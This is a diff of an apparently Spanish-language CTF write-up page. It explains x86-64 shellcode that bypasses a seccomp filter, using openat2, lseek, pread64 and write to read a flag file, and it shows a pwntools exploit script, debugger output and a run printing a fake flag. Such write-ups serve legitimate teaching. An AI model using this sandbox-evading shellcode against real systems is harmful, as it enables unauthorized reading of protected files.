+<p class="plain-text">Finalmente podemos usar la función <code class="language-plaintext highlighter-rouge">write</code> para mostrar el contenido de la <code class="language-plaintext highlighter-rouge">flag</code>, aqui el primer argumento es el descriptor que podemos establecer en <code class="language-plaintext highlighter-rouge">2</code> para la salida, luego lo que queremos enviar a el en este caso será el contenido del registro <code class="language-plaintext highlighter-rouge">rsp</code> donde almacenamos el contenido del archivo y el último la longitud del archivo.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">write(</span><span class="no">int</span><span class="p"> fd,</span><span class="o"> const</span><span class="no"> void</span><span class="p"> buf[.count],</span><span class="na"> size_t </span><span class="p">count);  </span>
+<code><span class="p">write(</span><span class="no">int</span><span class="p"> fd,</span><span class="o"> const</span><span class="no"> void</span><span class="p"> buf[.count],</span><span class="na"> size_t </span><span class="p">count);</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">write(</span><span class="mi">2</span><span class="p">,</span><span class="mi"> $rsp</span><span class="p">,</span><span class="mi"> 0x1a</span><span class="p">);  </span>
+<code><span class="p">write(</span><span class="mi">2</span><span class="p">,</span><span class="mi"> $rsp</span><span class="p">,</span><span class="mi"> 0x1a</span><span class="p">);</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al pasarlo a un shellcode solo nos queda modificar el descriptor, el resto de los argumentos ya están establecidos antes de hacer la syscall hacia <code class="language-plaintext highlighter-rouge">write</code></p>
+<p class="plain-text">Al pasarlo a un shellcode solo nos queda modificar el descriptor, el resto de los argumentos ya están establecidos antes de hacer la syscall hacia <code class="language-plaintext highlighter-rouge">write</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="o">    push</span><span class="mi"> 0x2</span><span class="c1">        # descriptor
-    </span><span class="o">pop</span><span class="mi"> rdi</span><span class="c1">         # $rdi = descriptor  
+    </span><span class="o">pop</span><span class="mi"> rdi</span><span class="c1">         # $rdi = descriptor
     </span><span class="o">push</span><span class="mi"> 0x1</span><span class="c1">        # write()
     </span><span class="o">pop</span><span class="mi"> rax</span><span class="c1">         # $rax = write()
 
@@ -411,9 +411,9 @@ shell.interactive()</span>
     </span><span class="o">syscall</span><span class="c1">         # syscall()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al llegar al breakpoint podemos ver que en <code class="language-plaintext highlighter-rouge">rsi</code> esta el contenido del la <code class="language-plaintext highlighter-rouge">flag</code> y en <code class="language-plaintext highlighter-rouge">rdx</code> la longitud de este mismo, la llamada deberia mostrar el contenido del archivo</p>
+<p class="plain-text">Al llegar al breakpoint podemos ver que en <code class="language-plaintext highlighter-rouge">rsi</code> está el contenido de la <code class="language-plaintext highlighter-rouge">flag</code> y en <code class="language-plaintext highlighter-rouge">rdx</code> la longitud de este mismo, la llamada debería mostrar el contenido del archivo.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">Program received signal SIGTRAP, Trace/breakpoint trap.  
+<code><span class="p">Program received signal SIGTRAP, Trace/breakpoint trap.
 </span><span class="az">0x000070b82e8e3040</span><span class="p"> in</span><span class="am"> ??</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> p/x $rdi
 </span><span class="az">$1</span><span class="p"> = 0x2
@@ -424,7 +424,7 @@ shell.interactive()</span>
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El exploit final usa funciones alternativas para leer el archivo y no tener problemas con <code class="language-plaintext highlighter-rouge">seccomp</code>, abre el archivo con <code class="language-plaintext highlighter-rouge">openat2</code>, calcula la longitud con <code class="language-plaintext highlighter-rouge">lseek</code> y lo lee con <code class="language-plaintext highlighter-rouge">pread64</code>, finalmente muestra con <code class="language-plaintext highlighter-rouge">write</code> el contenido de esta hacia la terminal</p>
+<p class="plain-text">El exploit final usa funciones alternativas para leer el archivo y no tener problemas con <code class="language-plaintext highlighter-rouge">seccomp</code>, abre el archivo con <code class="language-plaintext highlighter-rouge">openat2</code>, calcula la longitud con <code class="language-plaintext highlighter-rouge">lseek</code> y lo lee con <code class="language-plaintext highlighter-rouge">pread64</code>, finalmente muestra con <code class="language-plaintext highlighter-rouge">write</code> el contenido de esta hacia la terminal.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, asm
@@ -447,7 +447,7 @@ shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class
     pop rax         # $rax = openat2()
     syscall         # syscall
 
-    xchg rax, rdi   # $rdi = descriptor  
+    xchg rax, rdi   # $rdi = descriptor
     push 0x2        # whence
     pop rdx         # $rdx = whence
     xor rsi, rsi    # $rsi = offset
@@ -464,7 +464,7 @@ shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class
     syscall         # syscall
 
     push 0x2        # descriptor
-    pop rdi         # $rdi = descriptor  
+    pop rdi         # $rdi = descriptor
     push 0x1        # write()
     pop rax         # $rax = write()
     syscall         # syscall()
@@ -474,10 +474,10 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">".</span><sp
 shell.interactive()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al ejecutar el exploit envia el <code class="language-plaintext highlighter-rouge">shellcode</code> que muestra el contenido del archivo <code class="language-plaintext highlighter-rouge">flag</code></p>
+<p class="plain-text">Al ejecutar el exploit envia el <code class="language-plaintext highlighter-rouge">shellcode</code> que muestra el contenido del archivo <code class="language-plaintext highlighter-rouge">flag</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3</span><span class="p"> exploit.py
-[</span><span class="ve">+</span><span class="p">] Starting local process './bin': pid 107091  
+[</span><span class="ve">+</span><span class="p">] Starting local process './bin': pid 107091
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 FLAG{f4k3_fl4g_4_t35t1ng}
 </span><span class="ro">$</span>
